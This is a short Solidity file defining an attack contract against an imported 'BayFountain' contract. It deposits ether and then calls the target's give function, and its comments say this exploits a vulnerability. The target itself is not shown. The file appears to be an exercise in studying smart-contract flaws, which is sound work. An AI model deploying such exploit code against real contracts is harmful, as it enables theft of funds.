
pragma solidity ^0.4.25;
import "./BayFountain.sol";

// Contract to execute functions in the BayFountain contract. 
contract BayFountainAttack{
    // Stores the target BayFountain contract. 
    BayFountain public bayFountain;
    
    // Constructor creates a new BayFountainAttack and sets the target BayFountain contract.
    constructor (BayFountain _bayFountain) public {
        bayFountain = _bayFountain;
    } 
    
    // Payable function takes some ether and passes it to BayFountain. 
    function attackSetup () payable external{
        // Calls function add in BayFountain to add ether to balance.
        bayFountain.add.value(msg.value)();
    }
    
    // Function calls the give function in BayFountain to exploit the vulnerability. 
    function conductAttack() external{
        bayFountain.give(msg.sender);
    }
}